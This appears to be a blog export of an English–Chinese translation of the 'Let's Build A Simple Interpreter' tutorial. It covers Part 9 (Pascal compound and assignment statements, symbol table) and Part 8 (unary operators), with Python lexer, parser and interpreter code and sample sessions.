可以说，这与您在本系列前几篇文章之后编写的命令行解释器相比，是一个相当大的跳转，但我希望这是一个将带来令人兴奋的结果的跳转。它不再只是一个“计算器”，我们在这里变得严肃认真，Pascal 认真。😃 Let’s dive in and look at syntax diagrams for new language constructs and their corresponding grammar rules. 让我们深入研究一下新语言结构的语法图及其相应的语法规则。 On your marks: Ready. Set. Go! 各就各位: 预备，开始！ I’ll start with describing what a Pascal program is. A Pascal program consists of a compound statement that ends with a dot. Here is an example of a program: 我将从描述什么是 Pascal 程序开始。Pascal 程序由一个以点结尾的复合语句组成。下面是一个程序的例子: “BEGIN END.” I have to note that this is not a complete program definition, and we’ll extend it later in the series. 我必须指出，这并不是一个完整的程序定义，我们将在本系列后面对其进行扩展。 What is a compound statement? A compound statement is a block marked with BEGIN and END that can contain a list (possibly empty) of statements including other compound statements. Every statement inside the compound statement, except for the last one, must terminate with a semicolon. The last statement in the block may or may not have a terminating semicolon. Here are some examples of valid compound statements: 什么是复合语句？复合语句是标记为 BEGIN 和 END 的块，它可以包含包含其他复合语句的语句列表(可能为空)。除了最后一个语句之外，复合语句中的所有语句都必须以分号结束。块中的最后一个语句可能有也可能没有终止分号。下面是一些有效的复合语句的例子: “BEGIN END” “BEGIN a := 5; x := 11 END” “BEGIN a := 5; x := 11; END” “BEGIN BEGIN a := 5 END; x := 11 END” A statement list is a list of zero or more statements inside a compound statement. See above for some examples. 语句列表是复合语句中包含零个或多个语句的列表。 A statement can be a compound statement, an assignment statement, or it can be an empty statement. 语句可以是复合语句、赋值语句，也可以是空语句。 An assignment statement is a variable followed by an ASSIGN token (two characters, ‘:’ and ‘=’) followed by an expression. 赋值语句是一个变量，后跟一个 ASSIGN 标记(两个字符，‘ :’和‘ =’) ，然后是一个表达式。 “a := 11” “b := a + 9 - 5 * 2” A variable is an identifier. We’ll use the ID token for variables. The value of the token will be a variable’s name like ‘a’, ‘number’, and so on. In the following code block ‘a’ and ‘b’ are variables: 变量是一个标识符。我们将对变量使用 ID 标记。token的value将是变量的名称，如‘ a’、‘ number’等等。在下面的代码块中 a 和 b 是变量: “BEGIN a := 11; b := a + 9 - 5 * 2 END” An empty statement represents a grammar rule with no further productions. We use the empty_statement grammar rule to indicate the end of the statement_list in the parser and also to allow for empty compound statements as in ‘BEGIN END’. 空语句表示没有进一步结果的语法规则。我们使用 empty _ statement 语法规则来指示语法分析器中 statement _ list 的结尾，并且允许使用空的复合语句，如‘ BEGIN END’。 The factor rule is updated to handle variables. factor规则被更新以处理变量。 Now let’s take a look at our complete grammar: 现在让我们来看看完整的语法: program : compound_statement DOT compound_statement : BEGIN statement_list END statement_list : statement | statement SEMI statement_list statement : compound_statement | assignment_statement | empty assignment_statement : variable ASSIGN expr empty : expr: term ((PLUS | MINUS) term)* term: factor ((MUL | DIV) factor)* factor : PLUS factor | MINUS factor | INTEGER | LPAREN expr RPAREN | variable variable: ID You probably noticed that I didn’t use the star ‘*’ symbol in the compound_statement rule to represent zero or more repetitions, but instead explicitly specified the statement_list rule. This is another way to represent the ‘zero or more’ operation, and it will come in handy when we look at parser generators like PLY, later in the series. I also split the “(PLUS | MINUS) factor” sub-rule into two separate rules. 您可能已经注意到，在复合语句规则中，我没有使用星号‘ *’符号来表示零次或更多次的重复，而是明确指定了语句列表规则。这是表示“零或更多”操作的另一种方法，在本系列后面的文章中，当我们研究像 PLY 这样的解析器生成器时，它会派上用场。我还将(PLUS | MINUS) 这个factor 子规则分为两个独立的规则。 In order to support the updated grammar, we need to make a number of changes to our lexer, parser, and interpreter. Let’s go over those changes one by one. 为了支持更新后的语法，我们需要对词法分析器、语法分析器和解释器进行一些更改。让我们一个一个地复习一下这些变化。 Here is the summary of the changes in our lexer: 下面是 lexer 中的更改摘要: To support a Pascal program’s definition, compound statements, assignment statements, and variables, our lexer needs to return new tokens: 为了支持 Pascal 程序的定义、复合语句、赋值语句和变量，lexer 需要返回新的token: BEGIN (to mark the beginning of a compound statement) (标记复合语句的开头) END (to mark the end of the compound statement) (标记复合语句的结束) DOT (a token for a dot character ‘.’ required by a Pascal program’s definition) (Pascal 程序定义所要求的点字符“ .”的token) ASSIGN (a token for a two character sequence ‘:=’). In Pascal, an assignment operator is different than in many other languages like C, Python, Java, Rust, or Go, where you would use single character ‘=’ to indicate assignment (两个字符序列‘ : =’的token)。在 Pascal 中，赋值操作符不同于许多其他语言，如 c、 Python、 Java、 Rust 或 Go，在这些语言中，你可以使用单个字符‘ =’来表示赋值。 SEMI (a token for a semicolon character ‘;’ that is used to mark the end of a statement inside a compound statement) (分号字符‘ ;’的token，用于标记复合语句中语句的结束) ID (A token for a valid identifier. Identifiers start with an alphabetical character followed by any number of alphanumerical characters) (表示有效标识符的token。标识符以字母字符开头，后跟任意数量的字母数字字符) Sometimes, in order to be able to differentiate between different tokens that start with the same character, (‘:’ vs ‘:=’ or ‘==’ vs ‘=&gt;’ ) we need to peek into the input buffer without actually consuming the next character. For this particular purpose, I introduced a peek method that will help us tokenize assignment statements. The method is not strictly required, but I thought I would introduce it earlier in the series and it will also make the get_next_token method a bit cleaner. All it does is return the next character from the text buffer without incrementing the self.pos variable. Here is the method itself: 有时候，为了能够区分以相同字符开头的不同token（ :vs:= 或 = =vs=&gt; ) ，我们需要查看输入缓冲区，而不需要实际消耗下一个字符。为此，我介绍了一个 peek 方法，它将帮助我们对赋值语句tokenize。这个方法并不是严格要求的，但是我认为我应该在本系列的前面介绍这个方法，它还将使 get_next _ token 方法更加清晰。它所做的只是从文本缓冲区返回下一个字符，而不增加 self.pos 变量。这就是方法本身: def peek(self): peek_pos = self.pos + 1 if peek_pos &gt; len(self.text) - 1: return None else: return self.text[peek_pos] Because Pascal variables and reserved keywords are both identifiers, we will combine their handling into one method called _id. The way it works is that the lexer consumes a sequence of alphanumerical characters and then checks if the character sequence is a reserved word. If it is, it returns a pre-constructed token for that reserved keyword. And if it’s not a reserved keyword, it returns a new ID token whose value is the character string (lexeme). I bet at this point you think, “Gosh, just show me the code.” 😃 Here it is: 因为 Pascal 变量和保留关键字都是标识符，所以我们将它们的处理合并到一个名为 _id 的方法中。它的工作方式是，词法分析器“消耗”一个字母数字字符序列，然后检查字符序列是否是保留字。如果是，则返回该保留关键字的预构造token。如果它不是保留关键字，则返回一个新的 ID token，其值为字符串(lexeme)。我打赌此时你会想，“天哪，给我看看代码吧。”:)在这里: RESERVED_KEYWORDS = { 'BEGIN': Token('BEGIN', 'BEGIN'), 'END': Token('END', 'END'), } def _id(self): &quot;&quot;&quot;Handle identifiers and reserved keywords&quot;&quot;&quot; result = '' while self.current_char is not None and self.current_char.isalnum(): result += self.current_char self.advance() token = RESERVED_KEYWORDS.get(result, Token(ID, result)) return token And now let’s take a look at the changes in the main lexer method get_next_token: 现在让我们来看看 lexer 方法 get _ next _ token 中的更改: def get_next_token(self): while self.current_char is not None: ... if self.current_char.isalpha(): return self._id() if self.current_char == ':' and self.peek() == '=': self.advance() self.advance() return Token(ASSIGN, ':=') if self.current_char == ';': self.advance() return Token(SEMI, ';') if self.current_char == '.': self.advance() return Token(DOT, '.') ... It’s time to see our shiny new lexer in all its glory and action. Download the source code from GitHub and launch your Python shell from the same directory where you saved the spi.py file: 现在是时候看看我们新的 lexer 。从 GitHub 下载源代码，然后从保存 spi.py 文件的同一个目录启动 Python shell: &gt;&gt;&gt; from spi import Lexer &gt;&gt;&gt; lexer = Lexer('BEGIN a := 2; END.') &gt;&gt;&gt; lexer.get_next_token() Token(BEGIN, 'BEGIN') &gt;&gt;&gt; lexer.get_next_token() Token(ID, 'a') &gt;&gt;&gt; lexer.get_next_token() Token(ASSIGN, ':=') &gt;&gt;&gt; lexer.get_next_token() Token(INTEGER, 2) &gt;&gt;&gt; lexer.get_next_token() Token(SEMI, ';') &gt;&gt;&gt; lexer.get_next_token() Token(END, 'END') &gt;&gt;&gt; lexer.get_next_token() Token(DOT, '.') &gt;&gt;&gt; lexer.get_next_token() Token(EOF, None) &gt;&gt;&gt; Moving on to parser changes. 继续更改解析器。 Here is the summary of changes in our parser: 以下是我们解析器中的变化总结: Let’s start with new AST nodes: 让我们从新的 AST 节点开始: Compound AST node represents a compound statement. It contains a list of statement nodes in its children variable. Compound AST 节点表示一个复合语句，它的子变量中包含一个语句节点列表。 class Compound(AST): &quot;&quot;&quot;Represents a 'BEGIN ... END' block&quot;&quot;&quot; def __init__(self): self.children = [] Assign AST node represents an assignment statement. Its left variable is for storing a Var node and its right variable is for storing a node returned by the expr parser method: Assign AST 节点表示一个赋值语句。它的左变量用于存储 Var 节点，右变量用于存储 expr 解析方法返回的节点: class Assign(AST): def __init__(self, left, op, right): self.left = left self.token = self.op = op self.right = right Var AST node (you guessed it) represents a variable. The self.value holds the variable’s name. Var AST 节点(您猜对了)表示一个变量。 class Var(AST): &quot;&quot;&quot;The Var node is constructed out of ID token.&quot;&quot;&quot; def __init__(self, token): self.token = token self.value = token.value NoOp node is used to represent an empty statement. For example ‘BEGIN END’ is a valid compound statement that has no statements. NoOp 节点用于表示一个空语句。例如，BEGIN END 是一个没有语句的有效复合语句。 As you remember, each rule from the grammar has a corresponding method in our recursive-descent parser. This time we’re adding seven new methods. These methods are responsible for parsing new language constructs and constructing new AST nodes. They are pretty straightforward: 正如您所记得的，文法中的每个规则在我们的递归下降分析器中都有一个对应的方法。这次我们增加了七种新方法。这些方法负责解析新的语言结构并构造新的 AST 节点。它们非常直截了当: def program(self): &quot;&quot;&quot;program : compound_statement DOT&quot;&quot;&quot; node = self.compound_statement() self.eat(DOT) return node def compound_statement(self): &quot;&quot;&quot; compound_statement: BEGIN statement_list END &quot;&quot;&quot; self.eat(BEGIN) nodes = self.statement_list() self.eat(END) root = Compound() for node in nodes: root.children.append(node) return root def statement_list(self): &quot;&quot;&quot; statement_list : statement | statement SEMI statement_list &quot;&quot;&quot; node = self.statement() results = [node] while self.current_token.type == SEMI: self.eat(SEMI) results.append(self.statement()) if self.current_token.type == ID: self.error() return results def statement(self): &quot;&quot;&quot; statement : compound_statement | assignment_statement | empty &quot;&quot;&quot; if self.current_token.type == BEGIN: node = self.compound_statement() elif self.current_token.type == ID: node = self.assignment_statement() else: node = self.empty() return node def assignment_statement(self): &quot;&quot;&quot; assignment_statement : variable ASSIGN expr &quot;&quot;&quot; left = self.variable() token = self.current_token self.eat(ASSIGN) right = self.expr() node = Assign(left, token, right) return node def variable(self): &quot;&quot;&quot; variable : ID &quot;&quot;&quot; node = Var(self.current_token) self.eat(ID) return node def empty(self): &quot;&quot;&quot;An empty production&quot;&quot;&quot; return NoOp() We also need to update the existing factor method to parse variables: 我们还需要更新现有的 factor 方法来解析变量: def factor(self): &quot;&quot;&quot;factor : PLUS factor | MINUS factor | INTEGER | LPAREN expr RPAREN | variable &quot;&quot;&quot; token = self.current_token if token.type == PLUS: self.eat(PLUS) node = UnaryOp(token, self.factor()) return node ... else: node = self.variable() return node The parser’s parse method is updated to start the parsing process by parsing a program definition: 解析器的 parse 方法通过解析程序定义来更新开始解析过程: def parse(self): node = self.program() if self.current_token.type != EOF: self.error() return node Here is our sample program again: 下面是我们的示例程序: BEGIN BEGIN number := 2; a := number; b := 10 * a + 10 * number / 4; c := a - - b END; x := 11; END. Let’s visualize it with genastdot.py (For brevity, when displaying a Var node, it just shows the node’s variable name and when displaying an Assign node it shows ‘:=’ instead of showing ‘Assign’ text): 让我们使用 genastdot.py 将其可视化(为了简便起见，在显示 Var 节点时，它只显示节点的变量名，而在显示 Assign 节点时，它显示‘ : =’而不显示‘ Assign’文本) : $ python genastdot.py assignments.txt &gt; ast.dot &amp;&amp; dot -Tpng -o ast.png ast.dot ​ And finally, here are the required interpreter changes: 最后，以下是所需的解释器更改: To interpret new AST nodes, we need to add corresponding visitor methods to the interpreter. There are four new visitor methods: 要解释新的 AST 节点，我们需要向解释器添加相应的visitor方法。有四种新的访问方法: visit_Compound visit_Assign visit_Var visit_NoOp Compound and NoOp visitor methods are pretty straightforward. The visit_Compound method iterates over its children and visits each one in turn, and the visit_NoOp method does nothing. Compound 和 NoOp 访问者方法非常简单。 _visit_Compound _方法迭代它的子元素并依次访问每个子元素，而_visit_NoOp_方法什么也不做。 def visit_Compound(self, node): for child in node.children: self.visit(child) def visit_NoOp(self, node): pass The Assign and Var visitor methods deserve a closer examination. Assign 和 Var visitor 方法值得进一步研究。 When we assign a value to a variable, we need to store that value somewhere for when we need it later, and that’s exactly what the visit_Assign method does: 当我们为一个变量赋值时，我们需要将这个值存储在某个地方，以备以后需要时使用，而这正是 visit _ assign 方法所做的: def visit_Assign(self, node): var_name = node.left.value self.GLOBAL_SCOPE[var_name] = self.visit(node.right) The method stores a key-value pair (a variable name and a value associated with the variable) in a symbol table GLOBAL_SCOPE. What is a symbol table? A symbol table is an abstract data type (ADT) for tracking various symbols in source code. The only symbol category we have right now is variables and we use the Python dictionary to implement the symbol table ADT. For now I’ll just say that the way the symbol table is used in this article is pretty “hacky”: it’s not a separate class with special methods but a simple Python dictionary and it also does double duty as a memory space. In future articles, I will be talking about symbol tables in much greater detail, and together we’ll also remove all the hacks. 该方法在符号表 global_scope 中存储键值对(变量名和与变量关联的值)。什么是符号表？符号表是用于跟踪源代码中各种符号的抽象数据类型(ADT)。我们现在唯一的符号类别是变量，我们使用 Python 字典来实现符号表 ADT。现在我只想说，本文中使用符号表的方式非常“朴素”: 它不是一个带有特殊方法的单独类，而是一个简单的 Python 字典，它还兼有作为内存空间的双重任务。在以后的文章中，我将更详细地讨论符号表，我们还将一起删除所有的hacks。 Let’s take a look at an AST for the statement “a := 3;” and the symbol table before and after the visit_Assign method does its job: 让我们看一下语句“ a: = 3;”的 AST，并且在 visit _ assign 方法之前和之后的符号表完成了它的工作: Now let’s take a look at an AST for the statement “b := a + 7;” 现在让我们看一下语句“ b: = a + 7;”的 AST As you can see, the right-hand side of the assignment statement - “a + 7” - references the variable ‘a’, so before we can evaluate the expression “a + 7” we need to find out what the value of ‘a’ is and that’s the responsibility of the visit_Var method: 正如你所看到的，赋值语句的右边——“ a + 7”——引用了变量“ a”，所以在我们计算表达式“ a + 7”之前，我们需要找出“ a”的值，这是 visit _ var 方法的职责: def visit_Var(self, node): var_name = node.value val = self.GLOBAL_SCOPE.get(var_name) if val is None: raise NameError(repr(var_name)) else: return val When the method visits a Var node as in the above AST picture, it first gets the variable’s name and then uses that name as a key into the GLOBAL_SCOPE dictionary to get the variable’s value. If it can find the value, it returns it, if not - it raises a NameError exception. Here are the contents of the symbol table before evaluating the assignment statement “b := a + 7;”: 当该方法访问上面 AST 图片中的 Var 节点时，它首先获取变量的名称，然后使用该名称作为 GLOBAL _ scope 字典中的键来获取变量的值。如果它能找到该值，则返回该值，如果不能，则引发 NameError 异常。下面是在计算赋值语句“ b: = a + 7;”之前的符号表的内容: These are all the changes that we need to do today to make our interpreter tick. At the end of the main program, we simply print the contents of the symbol table GLOBAL_SCOPE to standard output. 这些就是我们今天需要做的所有改变，以使我们的解释器工作起来。在主程序的最后，我们简单地将符号表 GLOBAL _ scope 的内容打印到标准输出。 Let’s take our updated interpreter for a drive both from a Python interactive shell and from the command line. Make sure that you downloaded both the source code for the interpreter and the assignments.txt file before testing: 让我们从 Python 交互式 shell 和命令行获取已更新的解释器驱动器。在测试之前，确保你下载了解释器的源代码和 assignments.txt 文件: Launch your Python shell: 启动你的 Python shell: $ python &gt;&gt;&gt; from spi import Lexer, Parser, Interpreter &gt;&gt;&gt; text = &quot;&quot;&quot;\\ ... BEGIN ... ... BEGIN ... number := 2; ... a := number; ... b := 10 * a + 10 * number / 4; ... c := a - - b ... END; ... ... x := 11; ... END. ... &quot;&quot;&quot; &gt;&gt;&gt; lexer = Lexer(text) &gt;&gt;&gt; parser = Parser(lexer) &gt;&gt;&gt; interpreter = Interpreter(parser) &gt;&gt;&gt; interpreter.interpret() &gt;&gt;&gt; print(interpreter.GLOBAL_SCOPE) {'a': 2, 'x': 11, 'c': 27, 'b': 25, 'number': 2} And from the command line, using a source file as input to our interpreter: 在命令行中，使用源文件作为解释器的输入: $ python spi.py assignments.txt {'a': 2, 'x': 11, 'c': 27, 'b': 25, 'number': 2} If you haven’t tried it yet, try it now and see for yourself that the interpreter is doing its job properly. 如果你还没有尝试过，那么现在就试一试，看看译员是否正确地完成了它的工作。 Let’s sum up what you had to do to extend the Pascal interpreter in this article: 让我们总结一下在本文中扩展 Pascal 解释器所做的工作: Add new rules to the grammar 在grammar中添加新规则 Add new tokens and supporting methods to the lexer and update the _get_next_token _method 向 lexer 添加新的token和支持方法，并更新_get_next_token_方法 Add new nodes to the parser for new language constructs 为新语言结构添加新的node到解析器 Add new methods corresponding to the new grammar rules to our recursive-descent parser and update any existing methods, if necessary (factor method, I’m looking at you. 😃 向递归下降解析器中添加与新语法规则对应的新方法，并在必要时更新任何现有方法 Add new visitor methods to the interpreter 向解释器添加新的visitor方法 Add a dictionary for storing variables and for looking them up 添加一个用于存储变量和查找变量的字典 In this part I had to introduce a number of “hacks” that we’ll remove as we move forward with the series: 在这一部分中，我必须介绍一些“ hacks”，我们将在本系列后续文章中删除它们: The _program _grammar rule is incomplete. We’ll extend it later with additional elements. program的语法规则是不完整的。我们稍后将使用其他元素对其进行扩展 Pascal is a statically typed language, and you must declare a variable and its type before using it. But, as you saw, that was not the case in this article. Pascal 是一种静态类型语言，在使用它之前必须声明变量及其类型。但是，正如你所看到的，这篇文章并不是这样的 No type checking so far. It’s not a big deal at this point, but I just wanted to mention it explicitly. Once we add more types to our interpreter we’ll need to report an error when you try to add a string and an integer, for example. 到目前为止还没有类型检查。在这一点上，这不是什么大问题，但我只是想明确地提一下。一旦我们向解释器添加了更多的类型，我们就需要在尝试添加字符串和整数时报告一个错误 A symbol table in this part is a simple Python dictionary that does double duty as a memory space. Worry not: symbol tables are such an important topic that I’ll have several articles dedicated just to them. And memory space (runtime management) is a topic of its own. 本部分中的符号表是一个简单的 Python 字典，它兼有内存空间的双重任务。不用担心: 符号表是一个非常重要的主题，我将专门为它们写几篇文章。内存空间(运行时管理)是一个单独的话题 In our simple calculator from previous articles, we used a forward slash character ‘/’ for denoting integer division. In Pascal, though, you have to use a keyword _div _ to specify integer division (See Exercise 1). 在前面文章中的简单计算器中，我们使用了斜杠字符‘/’来表示整数除法。但在 Pascal 语言中，你必须使用关键词 div 来指定整数除法(请参阅练习1)。 There is also one hack that I introduced on purpose so that you could fix it in Exercise 2: in Pascal all reserved keywords and identifiers are case insensitive, but the interpreter in this article treats them as case sensitive. 我还故意介绍了一个hack，这样你就可以在练习2中修正它: 在 Pascal 语言中，所有保留的关键字和标识符都不区分大小写，但是本文中的解释器将它们视为区分大小写 To keep you fit, here are new exercises for you: 练习： Pascal variables and reserved keywords are case insensitive, unlike in many other programming languages, so BEGIN, begin, and BeGin they all refer to the same reserved keyword. Update the interpreter so that variables and reserved keywords are case insensitive. Use the following program to test it: 与许多其他编程语言不同，Pascal 变量和保留关键字不区分大小写，因此 BEGIN、 BEGIN 和 BEGIN 都引用同一个保留关键字。更新解释器，使变量和保留关键字不区分大小写。使用以下程序进行测试: BEGIN BEGIN number := 2; a := NumBer; B := 10 * a + 10 * NUMBER / 4; c := a - - b end; x := 11; END. I mentioned in the “hacks” section before that our interpreter is using the forward slash character ‘/’ to denote integer division, but instead it should be using Pascal’s reserved keyword div for integer division. Update the interpreter to use the div keyword for integer division, thus eliminating one of the hacks. 我在前面的“ hacks”部分提到过，我们的解释器使用正斜杠字符‘/’来表示整数除法，但是它应该使用 Pascal 的保留关键字 div 来表示整数除法。更新解释器，使其使用 div 关键字进行整数除法，从而消除一个 hacks。 ​ Update the interpreter so that variables could also start with an underscore as in ‘_num := 5’. 更新解释器，使得变量也可以以_num := 5中的下划线开头。 That’s all for today. Stay tuned and see you soon. 今天就到这里，敬请期待。 Here is a list of books I recommend that will help you in your study of interpreters and compilers: 以下是我推荐的一些书籍，它们可以帮助你学习解释器和编译器: Language Implementation Patterns: Create Your Own Domain-Specific and General Programming Languages (Pragmatic Programmers) 语言实现模式: 创建您自己的特定领域和通用编程语言(实用程序员) Compilers: Principles, Techniques, and Tools (2nd Edition) 编译器: 原理、技术和工具(第二版) If you want to get my newest articles in your inbox, then enter your email address below and click &quot;Get Updates!&quot; 如果你想得到我的最新文章在您的收件箱，然后输入您的电子邮件地址下面，并点击“获取更新!” All articles in this series: 本系列的所有文章: Let's Build A Simple Interpreter. Part 1. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 2. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 3. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 4. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 5. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 6. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 7: Abstract Syntax Trees 让我们构建一个简单的解释器。第7部分: 抽象语法树 Let's Build A Simple Interpreter. Part 8. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 9. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 10. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 11. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 12. 让我们构建一个简单的解释器 Let's Build A Simple Interpreter. Part 13: Semantic Analysis 让我们建立一个简单的解释器。第13部分: 语义分析 Let's Build A Simple Interpreter. Part 14: Nested Scopes and a Source-to-Source Compiler 让我们构建一个简单的解释器。第14部分: 嵌套作用域和源到源编译器 Let's Build A Simple Interpreter. Part 15. 让我们构建一个简单的解释器。第15部分 Let's Build A Simple Interpreter. Part 16: Recognizing Procedure Calls 让我们建立一个简单的解释器。第16部分: 识别过程调用 Let's Build A Simple Interpreter. Part 17: Call Stack and Activation Records 让我们构建一个简单的解释器。第17部分: 调用堆栈和激活记录 Let's Build A Simple Interpreter. Part 18: Executing Procedure Calls 让我们构建一个简单的解释器。第18部分: 执行过程调用 Let's Build A Simple Interpreter. Part 19: Nested Procedure Calls 让我们构建一个简单的解释器。第19部分: 嵌套过程调用 ","link":"https://lzxzl.github.io/post/fan-yi-yu-xue-xi-lets-build-a-simple-interpreter-part-9/"},{"title":"[翻译与学习] Let's Build A Simple Interpreter. Part 8.","content":"Today we’ll talk about unary operators, namely unary plus (+) and unary minus (-) operators. 今天我们将讨论一元运算符，即一元加号(+)和一元减号(-)运算符。 A lot of today’s material is based on the material from the previous article, so if you need a refresher just head back to Part 7 and go over it again. Remember: repetition is the mother of all learning. 今天的很多内容都是基于前一篇文章的内容，所以如果需要复习一下第7部分，再复习一遍。记住: 重复是学习之母。 Having said that, this is what you are going to do today: 话虽如此，这是你今天要做的: extend the grammar to handle unary plus and unary minus operators 扩展grammar来处理一元加号和一元减号运算符 add a new UnaryOp AST node class 添加一个新的UnaryOp AST节点类 extend the parser to generate an AST with UnaryOp nodes 扩展解析器以生成有UnaryOp节点的AST extend the interpreter and add a new visit_UnaryOp unaryop method to interpret unary operators 扩展解释器并添加一个新的visit_UnaryOp方法来解释一元运算符 Let’s get started, shall we? 我们开始吧？ So far we’ve worked with binary operators only (+, -, *, /), that is, the operators that operate on two operands. 到目前为止，我们只使用了二元运算符(+ ,-，* ,/) ，即对两个操作数进行操作的运算符。 What is a unary operator then? A unary operator is an operator that operates on one operand only. 那什么是一元运算符? 一元运算符是只对一个操作数运算的运算符。 Here are the rules for unary plus and unary minus operators: 下面是一元加号和一元减号运算符的规则: The unary minus (-) operator produces the negation of its numeric operand 一元减号(-)运算符将对其数值操作数进行求反 The unary plus (+) operator yields its numeric operand without change 一元加(+)运算符对其数值操作数不做改变 The unary operators have higher precedence than the binary operators +, -, *, and / 一元运算符的优先级高于二元运算符 + 、-、 * 和/ In the expression “+ - 3” the first ‘+’ operator represents the unary plus operation and the second ‘-‘ operator represents the unary minus operation. The expression “+ - 3” is equivalent to “+ (- (3))” which is equal to -3. One could also say that -3 in the expression is a negative integer, but in our case we treat it as a unary minus operator with 3 as its positive integer operand: 在表达式“ +-3”中，第一个“ +”运算符表示一元加运算，第二个“-”运算符表示一元减运算。表达式“ +-3”等于“ + (- (3))”，等于 -3。也可以说表达式中的 -3是一个负整数，但是在我们的例子中，我们把它当作一元减运算符，3作为它的正整数操作数: Let’s take a look at another expression, “5 - - 2”: 让我们看看另一个表达式：“5 - - 2”： In the expression “5 - - 2” the first ‘-‘ represents the binary subtraction operation and the second ‘-‘ represents the unary minus operation, the negation. 在表达式“5-2”中，第一个“-”表示二元减法运算，第二个“-”表示一元减法运算，即负。 ​ And some more examples: 还有一些例子: Now let’s update our grammar to include unary plus and unary minus operators. We’ll modify the factor rule and add unary operators there because unary operators have higher precedence than binary +, -, * and / operators. ​ 现在让我们更新我们的语法，包括一元加号和一元减号运算符。我们将修改 factor 规则并在其中添加一元运算符，因为一元运算符的优先级高于二元 + 、-、 * 和/运算符。 ​ This is our current factor rule: 这是我们当前的 factor 规则： And this is our updated factor rule to handle unary plus and unary minus operators: 这是我们更新的处理一元加号和一元减号运算符的factor规则: As you can see, I extended the factor rule to reference itself, which allows us to derive expressions like “- - - + - 3”, a legitimate expression with a lot of unary operators. 正如您所看到的，我将 factor 规则扩展到了引用本身，它允许我们派生“-- +-3”之类的表达式，这是一个合法的表达式，有很多一元运算符。 Here is the full grammar that can now derive expressions with unary plus and unary minus operators: 下面是完整的语法，现在可以用一元加号和一元减号运算符派生表达式: ​ The next step is to add an AST node class to represent unary operators. 下一步是添加一个 AST 节点类来表示一元运算符。 This one will do: class UnaryOp(AST): def __init__(self, op, expr): self.token = self.op = op self.expr = expr The constructor takes two parameters: op, which represents the unary operator token (plus or minus) and expr, which represents an AST node. 构造函数接受两个参数: op，表示一元运算符 token (加号或减号) ; expr，表示 AST 节点。 Our updated grammar had changes to the factor rule, so that’s what we’re going to modify in our parser - the factor method. We will add code to the method to handle the “(PLUS | MINUS) factor” sub-rule: 我们更新的语法对 factor 规则进行了更改，因此我们将在解析器中修改这个factor方法。我们将在方法中添加代码来处理“(PLUS | MINUS) factor”子规则: def factor(self): &quot;&quot;&quot;factor : (PLUS | MINUS) factor | INTEGER | LPAREN expr RPAREN&quot;&quot;&quot; token = self.current_token if token.type == PLUS: self.eat(PLUS) node = UnaryOp(token, self.factor()) return node elif token.type == MINUS: self.eat(MINUS) node = UnaryOp(token, self.factor()) return node elif token.type == INTEGER: self.eat(INTEGER) return Num(token) elif token.type == LPAREN: self.eat(LPAREN) node = self.expr() self.eat(RPAREN) return node And now we need to extend the Interpreter class and add a visit_UnaryOp method to interpret unary nodes: 现在我们需要扩展 Interpreter 类并添加一个 visit _ unaryop 方法来解释一元节点: def visit_UnaryOp(self, node): op = node.op.type if op == PLUS: return +self.visit(node.expr) elif op == MINUS: return -self.visit(node.expr) Onward! Let’s manually build an AST for the expression “5 - - - 2” and pass it to our interpreter to verify that the new visit_UnaryOp method works. Here is how you can do it from the Python shell: 让我们为表达式“5---2”手动构建一个 AST，并将其传递给我们的解释器，以验证新的 visit _ unaryop 方法是否工作。下面是如何在 Python shell 中实现它的方法: &gt;&gt;&gt; from spi import BinOp, UnaryOp, Num, MINUS, INTEGER, Token &gt;&gt;&gt; five_tok = Token(INTEGER, 5) &gt;&gt;&gt; two_tok = Token(INTEGER, 2) &gt;&gt;&gt; minus_tok = Token(MINUS, '-') &gt;&gt;&gt; expr_node = BinOp( ... Num(five_tok), ... minus_tok, ... UnaryOp(minus_token, UnaryOp(minus_token, Num(two_tok))) ... ) &gt;&gt;&gt; from spi import Interpreter &gt;&gt;&gt; inter = Interpreter(None) &gt;&gt;&gt; inter.visit(expr_node) 3 Visually the above AST tree looks like this: 从视觉上看，上面的 AST 树是这样的 Download the full source code of the interpreter for this article directly from GitHub. Try it out and see for yourself that your updated tree-based interpreter properly evaluates arithmetic expressions containing unary operators. 直接从 GitHub 下载本文解释器的完整源代码。您可以亲自尝试一下，看看您更新的基于树的解释器是否正确地计算包含一元运算符的算术表达式。 ​ Here is a sample session: $ python spi.py spi&gt; - 3 -3 spi&gt; + 3 3 spi&gt; 5 - - - + - 3 8 spi&gt; 5 - - - + - (3 + 4) - +2 10 I also updated the genastdot.py utility to handle unary operators. Here are some of the examples of the generated AST images for expressions with unary operators: 我还更新了 genastdot.py 实用程序来处理一元操作符。下面是一元运算符表达式生成的 AST 图像的一些例子: $ python genastdot.py &quot;- 3&quot; &gt; ast.dot &amp;&amp; dot -Tpng -o ast.png ast.dot $ python genastdot.py &quot;+ 3&quot; &gt; ast.dot &amp;&amp; dot -Tpng -o ast.png ast.dot $ python genastdot.py &quot;5 - - - + - 3&quot; &gt; ast.dot &amp;&amp; dot -Tpng -o ast.png ast.dot $ python genastdot.py &quot;5 - - - + - (3 + 4) - +2&quot; \\ ast.dot &amp;&amp; dot -Tpng -o ast.png ast.dot And here is a new exercise for you: 练习： Install Free Pascal, compile and run testunary.pas, and verify that the results are the same as produced with your spi interpreter. 安装Free Pascal，编译并运行testunary.pas，验证结果是否和你的spi解释器的结果一样。 That’s all for today. In the next article, we’ll tackle assignment statements. Stay tuned and see you soon. 今天就到这里。在下一篇文章中，我们将处理赋值语句。请继续关注，稍后见。​ Here is a list of books I recommend that will help you in your study of interpreters and compilers: Language Implementation Patterns: Create Your Own Domain-Specific and General Programming Languages (Pragmatic Programmers) Writing Compilers and Interpreters: A Software Engineering Approach Modern Compiler Implementation in Java Modern Compiler Design Compilers: Principles, Techniques, and Tools (2nd Edition) If you want to get my newest articles in your inbox, then enter your email address below and click &quot;Get Updates!&quot; 以下是我推荐的一些书籍，它们可以帮助你学习解释器和编译器: All articles in this series: Let's Build A Simple Interpreter. Part 1. Let's Build A Simple Interpreter. Part 2. Let's Build A Simple Interpreter. Part 3. Let's Build A Simple Interpreter. Part 4. 